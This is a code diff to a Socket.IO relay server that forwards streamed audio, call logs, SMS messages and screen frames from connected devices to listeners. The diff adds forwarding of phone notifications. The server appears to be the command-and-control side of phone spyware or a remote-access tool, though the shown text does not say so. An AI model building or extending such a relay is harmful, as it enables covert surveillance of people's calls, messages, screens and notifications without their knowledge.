@@ -45,7 +45,7 @@ io.on("connection", (socket) => {
     listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
   });
 
-  // Forward call logs (optional periodic batch)
+  // Forward call logs
   socket.on("call-logs", (logs) => {
     console.log(`📋 Call logs from ${socket.id}, count: ${logs.length}`);
     listeners.forEach((id) => io.to(id).emit("call-logs", logs));
@@ -63,10 +63,22 @@ io.on("connection", (socket) => {
     listeners.forEach((id) => io.to(id).emit("sms-received", sms));
   });
 
-  // ✅ Forward screen frames (new feature)
+  // Forward screen frames
   socket.on("screen-frame", (frame) => {
     console.log(`🖥️ Screen frame from ${socket.id}, size: ${frame.length}`);
     listeners.forEach((id) => io.to(id).emit("screen-frame", frame));
+  });
+
+  // ✅ Forward notification posted
+  socket.on("notification-posted", (data) => {
+    console.log(`🔔 Notification posted from ${socket.id}:`, data);
+    listeners.forEach((id) => io.to(id).emit("notification-posted", data));
+  });
+
+  // ✅ Forward notification removed
+  socket.on("notification-removed", (data) => {
+    console.log(`❌ Notification removed from ${socket.id}:`, data);
+    listeners.forEach((id) => io.to(id).emit("notification-removed", data));
   });
 
   // Handle disconnect
